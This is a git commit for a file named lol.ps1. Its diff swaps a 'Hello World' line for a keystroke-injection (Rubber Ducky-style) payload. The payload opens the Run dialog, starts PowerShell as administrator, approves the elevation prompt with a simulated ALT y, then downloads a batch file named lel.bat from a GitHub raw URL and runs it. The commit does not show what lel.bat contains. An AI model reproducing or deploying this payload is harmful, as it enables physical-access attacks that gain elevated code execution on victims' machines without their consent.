d09b1b0ae1a9d79a6a17c93722aeec9bcaea7c06
deathlimited <denis_srk@live.com>
2017-11-17 03:14:59 +0200

    Update lol.ps1

--- lol.ps1
+++ lol.ps1
@@ -1,1 +1,9 @@
-Write-Output "Hello World"
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 200
+STRING $down = New-Object System.Net.WebClient; $url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'; $file = 'lel.bat'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
